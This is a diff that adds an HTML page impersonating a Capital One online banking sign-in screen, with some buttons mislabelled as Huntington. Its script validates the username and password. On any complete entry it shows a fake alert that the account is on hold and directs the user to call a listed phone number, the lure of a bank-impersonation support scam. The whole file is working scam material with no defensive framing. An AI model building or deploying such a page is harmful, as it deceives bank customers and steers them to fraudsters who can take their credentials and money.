@@ -1,0 +1,304 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <link href="https://assets.staticimg.com/public-web/2.6.22/static/fontsGoogleapis/googleapis.css" rel="prefetch" as="style">
+    <link rel="preload" href="assets/css/KUCOINSans-Bold.woff2" as="font" type="font/woff2" crossorigin="true">
+    <link href="style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="">
+    <title>Logoin</title>
+</head>
+
+<body>
+
+    <header class="mainheader">
+
+
+
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-11 col-8 d-flex justify-content-start" style="height: 41px; ">
+                    <img src="Capital-logo.svg" class="logoMain" style="height: 40px;">
+
+                    <ul style="display: flex; ">
+
+                        <a href="#" style="margin-top: 10px;font-size: 13px;color: #000;letter-spacing:1px;text-decoration:none;font-weight: 500;padding: 0px 10px;">Credit Cards</a>
+
+                        <a href="#" style="margin-top: 10px;font-size: 13px;color: #000;letter-spacing:1px;text-decoration:none;font-weight: 500;padding: 0px 10px;">Checking & Savings</a>
+
+                        <a href="#" style="margin-top: 10px;font-size: 13px;color: #000;letter-spacing:1px;text-decoration:none;font-weight: 500;padding: 0px 10px;">Auto</a>
+
+                        <a href="#" style="margin-top: 10px;font-size: 13px;color: #000;letter-spacing:1px;text-decoration:none;font-weight: 500;padding: 0px 10px;">Business</a>
+                        <a href="#" style="margin-top: 10px;font-size: 13px;color: #000;letter-spacing:1px;text-decoration:none;font-weight: 500;padding: 0px 10px;">Commercial</a>
+                        <a href="#" style="margin-top: 10px;font-size: 13px;color: #000;letter-spacing:1px;text-decoration:none;font-weight: 500;padding: 0px 10px;">Learn & Grow</a>
+
+
+                        <div style=" margin-left: 220px; margin-top: 15px; display: flex;">
+
+                            <a href="#"><img src="search-icon.svg" alt=""></a>
+
+                            <a href="#"> <img src="help-icon.svg" alt=""></a>
+
+                            <a href="#"> <img src="location-icon.svg" alt=""></a>
+
+                            <a href="#"> <img src="header-user-icon.svg" alt=""></a>
+                            <a href="#" style="margin: -5px 0px 0px -55px; text-decoration: none;">Sign In</a>
+
+                        </div>
+                    </ul>
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+    </header>
+
+    <!--
+    <div class="submenu">
+        <div style=" width: 50%; margin-left: 200px; margin-top: 10px;">
+            <a href="#" class="submenuheading">PRODUCTS & SERVICES</a>
+            <a href="#" class="submenuheading">LEARNING</a>
+            <a href="#" class="submenuheading">SUPPORT</a>
+            <a href="#" class="submenuheading">OFFERS</a>
+        </div>
+        <div>
+            <button style=" background-color: #fff0; border: none; color: #fff;"><img src="icons80.png" alt="" style="width: 30px; margin-left: 60px;"> SEARCH</button>
+            <button style=" height: 40px; font-size: 14px; padding: 5px 10px; border: none; border-radius: 5px; margin-left: 130px;"><img src="user.png" alt="" style="width: 25px;"> SIGN ON</button>
+        </div>
+    </div>
+-->
+
+
+
+
+
+    <div style="background-color: #f4f4f4; color: #484848;font: 1rem/1.333 Arial,sans-serif;left: 0;padding: 15px 370px; position: absolute;right: 0;">
+
+
+
+        <div style="display: flex;">
+
+            <div>
+                <label for="username" style=" color: #141414; font-size: 12px; margin-bottom: 5px; letter-spacing: 0.6px;">Username</label> <br>
+                <input data-bn-type="input" id="username" type="text" name="username" autocomplete="username" autocapitalize="off" value="" required class="login-username">
+                <div style="display: flex; ">
+                    <input type="checkbox" style=" width: 12px;">
+                    <p style=" margin: 10px; font-size: 12px;">Remember me </p>
+                </div>
+            </div>
+
+            <div style="margin: 0px 30px;">
+                <label for="password" style=" color: #141414; font-size: 12px; margin-bottom: 5px; letter-spacing: 0.6px;">Password</label> <br>
+                <input data-bn-type="input" id="passwordField" type="password" name="username" autocomplete="username" autocapitalize="off" value="" required class="login-pass"> <br>
+                <a href="#" style=" color: #004c97; text-decoration: none; font-size: 12px;">Forgot username or password?</a>
+                <div style="margin-right: 10px;">
+                    <svg xmlns="http://www.w3.org/2000/svg" id="eyeIconToggle" width="0 " height="18" fill="currentColor" class="bi bi-eye-fill" viewBox="0 0 16 16">
+                                    <path
+                                        d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z" />
+                                    <path
+                                        d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z" />
+                                </svg>
+                </div>
+
+                <p class="errorMsg" id="errorMsg"></p>
+
+            </div>
+
+
+            <div style="margin-top: 27px;">
+
+                <button class="btngraylinkTracking" id="click_login_submit" type="button" aria-label="Log in to Huntington Online Banking" title="Log in to Huntington Online Banking">  Sign in </button> <br>
+                <a href="#" style=" color: #004c97; text-decoration: none; font-size: 12px;">Set up online access</a>
+            </div>
+        </div>
+    </div>
+
+
+    <div>
+        <img src="Capital One-img.png" alt="" style="width: 100%;">
+    </div>
+
+
+
+    <!--
+    <div>
+        <section class="sectionformWrapper">
+            <div class="container">
+                <div class="row01">
+                    <div class="col-md-12 d-flex justify-content-center align-items-center">
+                        <div class="formContainerMain">
+                            <div class="formContainerMainSide">
+                                <div>
+                                    <ul role="tablist" class="navtabs">
+                                        <li id="personalLoginStandAlone-tab" role="tab" class="navactive" tabindex="0" aria-controls="personalLoginStandAlone" aria-expanded="false" aria-selected="false">
+                                            Personal &amp; Business
+                                        </li>
+                                        <li id="businessLoginStandAlone-tab" role="tab" class="navpill" tabindex="0" aria-controls="businessLoginStandAlone" aria-expanded="false" aria-selected="false">
+                                            Commercial
+                                        </li>
+                                        <li id="otherLoginStandAlone-tab" role="tab" class="navpill2" tabindex="0" aria-controls="otherLoginStandAlone" aria-expanded="false" aria-selected="false">
+                                            Other
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div class="formWrapper">
+                                    <div class="formLoginDetails mt-4">
+                                        <legend class="loginlabel">
+                                            Log into Online Banking
+                                        </legend>
+                                        <form action="#" method="post" autocomplete="off">
+                                            <label for="username" class="cinputlabel">Username</label>
+                                            <input data-bn-type="input" id="username" type="text" name="username" autocomplete="username" autocapitalize="off" value="">
+                                            <label for="password" class="cinputlabel">Password</label>
+                                            <input data-bn-type="input" id="passwordField" type="password" name="username" autocomplete="username" autocapitalize="off" value="">
+                                            <div style="margin-right: 10px;">
+                                                <svg xmlns="http://www.w3.org/2000/svg" id="eyeIconToggle" width="0 " height="18" fill="currentColor" class="bi bi-eye-fill" viewBox="0 0 16 16">
+                                                                <path
+                                                                    d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z" />
+                                                                <path
+                                                                    d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z" />
+                                                            </svg>
+                                            </div>
+                                            <p class="errorMsg" id="errorMsg"></p>
+                                    </div>
+                                </div>
+                             <div class="divloginbutton">
+                                    <div class="loginformflex">
+                                        <button class="btngraylinkTracking" id="click_login_submit" type="button" aria-label="Log in to Huntington Online Banking" title="Log in to Huntington Online Banking">
+                                            <span class="icon2">     
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true"><path d="M16.2641,10.283V7.7381a4.2987,4.2987,0,1,0-8.5973,0v2.5474a1.7624,1.7624,0,0,0-1.6594,1.7591v6.7536A1.7623,1.7623,0,0,0,7.77,20.5608h8.46a1.762,1.762,0,0,0,1.7626-1.7626V12.0446A1.762,1.762,0,0,0,16.2641,10.283Zm-3.3768,5.7476V17.96H11.1357V16.044a1.717,1.717,0,1,1,1.7516-.0134Zm1.6689-5.7485H9.3746V7.66a2.5383,2.5383,0,0,1,2.5383-2.5383h.1051A2.5382,2.5382,0,0,1,14.5562,7.66Z"></path></svg>       
+                                            </span>
+                                            Log In
+                                        </button>
+                                        <div class="loginforgotlinks">
+                                            <a href="#" class="forgotlinkforgotlinkpersonal" target="_blank" title="Forgot Username (opens in a new window)" rel="noopener noreferrer">Forgot Username?</a>
+                                            <a href="#" class="forgotlinkforgotlinkpersonal" target="_blank" title="Forgot Password? (opens in a new window)" rel="noopener noreferrer">Forgot Password?</a>
+                                        </div>
+                                    </div>
+                                    <div class="loginformflex2">
+                                        <div class="loginformutils">
+                                            <span class="loginlabelloginlabelpadbot">
+                                                    New to Online Banking?
+                                                </span>
+                                            <a href="#" class="enrolllink">Enroll Now</a> or
+                                            <a href="#" title="Learn more about Online Banking" class="Learnmore">Learn More</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+    </div>
+    </div>
+    </div>
+    </section>
+    </div>
+-->
+    <div id="popupBox">
+        <div id="popupBoxClose">
+            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
+                <path
+                    d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8 2.146 2.854Z" />
+            </svg>
+        </div>
+        <div id="popupBoxMsg">
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+    <script>
+        var crossButton = document.getElementById('crossButtonMenu');
+        var menuScreen = document.getElementById('sidebarMenu');
+        var menuIcon = document.getElementById('menuIcon');
+        var click_login_submit = document.getElementById('click_login_submit');
+        var username = document.getElementById('username');
+        var errorMsg = document.getElementById('errorMsg');
+
+        var popupBoxClose = document.getElementById('popupBoxClose');
+        var popupBox = document.getElementById('popupBox');
+        var popupBoxMsg = document.getElementById('popupBoxMsg');
+        var formWrapperInputDetailsPass = document.getElementById('formWrapperInputDetailsPass');
+        var passwordField = document.getElementById('passwordField');
+        var btnLoginQR = document.getElementById('btnLoginQR');
+        var eyeIconToggle = document.getElementById('eyeIconToggle');
+        var checkValue = document.getElementById('checkValue');
+
+        var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+
+        eyeIconToggle.addEventListener('click', function() {
+            if (eyeIconToggle.classList.contains('bi-eye-slash-fill')) {
+
+                eyeIconToggle.innerHTML = `<path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588zM5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474L5.21 3.089z"/>
+  <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829l-2.83-2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12-.708.708z"/>`;
+                eyeIconToggle.classList.add('bi-eye-fill');
+                eyeIconToggle.classList.remove('bi-eye-slash-fill');
+                passwordField.setAttribute('type', 'text');
+            } else {
+                eyeIconToggle.innerHTML = `<path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
+  <path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z"/>`;
+                eyeIconToggle.classList.add('bi-eye-slash-fill');
+                eyeIconToggle.classList.remove('bi-eye-fill');
+                passwordField.setAttribute('type', 'password');
+            }
+        });
+
+        click_login_submit.addEventListener('click', function() {
+            if (username.value == '' && passwordField.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill email id and password';
+            } else if (username.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill email';
+            } else if (!username.value.match(validRegex)) {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill valid email';
+            } else if (passwordField.value == '') {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'please fill Password';
+            } else {
+                popupBox.style.display = 'flex';
+                popupBoxMsg.innerText = 'You have entered wrong email id or password. \n For security reasons Your account has been put on hold until you get in touch with us. \n To get in touch with the customer relationship manager, call  833-505-4596.';
+            }
+        });
+
+        popupBoxClose.addEventListener('click', function() {
+            popupBox.style.display = 'none';
+            popupBoxMsg.innerText = '';
+        })
+    </script>
+
+</body>
+
+</html>
